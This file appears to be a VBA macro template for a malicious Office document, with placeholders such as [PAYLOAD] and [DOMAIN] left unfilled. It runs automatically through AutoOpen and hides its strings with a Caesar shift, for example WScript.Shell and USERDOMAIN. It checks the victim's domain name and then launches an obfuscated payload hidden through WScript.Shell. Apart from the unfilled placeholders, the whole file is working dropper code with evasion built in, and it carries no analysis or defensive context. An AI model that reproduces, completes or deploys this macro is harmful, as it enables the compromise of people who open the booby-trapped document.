Sub AutoOpen()
	Dim var1 As String
	Dim var2 As String
	Dim var3 As String
	Dim var15 As String
	Dim var16 As String
	Dim int1 As Integer
	Dim int2 As Integer
	Dim int3 As Integer

	int1 = [INT1]
	int2 = [INT2]
	int3 = [INT3]
	var2 = "data1"
	var1 = "func3"
	var16 = "Zvfulsw1Vkhoo"
	var1 = func1(var1, var2, int1)
	var2 = "func2"
	var3 = func1(var2, var1, int2)
	If (var3 = "cond1") Then
		Dim var11 As Object
		var15 = "func4"
		var15 = func1(var15, var16, int3)
		Set var11 = CreateObject(var15)
		var15 = func5(var15)
		Dim var32 As String
		var32 = var15
		var15 = "func8"
		var32 = func1(var15, var32, int3)
		var32 = func7(var11, var32, int1)
		Set var11 = Nothing
	End If
End Sub

Function func1(var4 As String, var5 As String, var6 As Integer) As String
    If (var6 > 1) Then
        func1 = Application.Run(var4, var5)
    End If
End Function

Function func2(var7 As String) As String
    Dim var8 As String
    Dim var17 As String
    Dim var18 As String
    Dim int4 As Integer
    int4 = [INT4]
    var17 = "func9"
    var18 = "[DOMAIN]"
    var17 = func1(var17, var18, int4)
    var8 = var17
    If (UCase(var7) = var8) Then
        func2 = "cond1"
    Else
        func2 = "cond2"
    End If
End Function

Function func3(var9 As String) As String
    Dim var10 As String
	Dim var20 As String
	Dim int5 As Integer
	int5 = [INT5]
	var20 = "func4"
	var20 = func1(var20, "XVHUGRPDLQ", int5)
    var10 = Environ(var20)
	var20 = func5(var20)
    func3 = var10
End Function

Function func4(var12 As String) As String
    Dim var13 As Long
    Dim var14 As String
	Dim int9 As Integer
	int9 = 3
    For var13 = 1 To Len(var12)
        var14 = var14 & Chr(Asc(Mid(var12, var13, 1)) - int9)
    Next var13
	var29 = func5(var14)
    func4 = var14
End Function

Function func8(var37 As String) As String
	Dim var36 As String
	[PAYLOAD]
	var36 = [PAYLOAD_ARGS]
	var36 = func9(var36)
	func8 = var36
End Function

Function func9(var42 As String) As String
    Dim var43 As Long
    Dim var44 As String
	Dim int8 As Integer
	int8 = [OFFSET]
    For var43 = 1 To Len(var42)
        var44 = var44 & Chr(Asc(Mid(var42, var43, 1)) - int8)
    Next var43
	var29 = func5(var44)
    func9 = var44
End Function

Function func5(var21 As String) As String
	Dim int6 As Integer
	Dim var25 As String
	If (UCase(var21) = "var22") Then
		int6 = [SMALLINT4]
	Else
		int6 = [SMALLINT5]
	End If
	var26 = func6(var21, int6)
	If (var26 = "var27") Then
		func5 = var26
	Else
		func5 = "var28"
	End If
End Function

Function func7(var30 As Object, var31 As String, var33 As Integer) As String
	Dim var34 As String
	Dim var35 As Integer
	var35 = 1
	var34 = var31
    If (var33 > var35) Then
		var35 = var35 - 1
		var30.Run var34, var35, True
	End If
	var34 = "var38"
	func7 = var34
End Function

Function func6(var23 As String, int7 As Integer) As String
    Dim var22 As Long
    Dim var24 As String
    For var22 = 1 To Len(var23)
        var24 = var24 & Chr(Asc(Mid(var23, var22, 1)) - int7)
    Next var22
    func6 = var24
End Function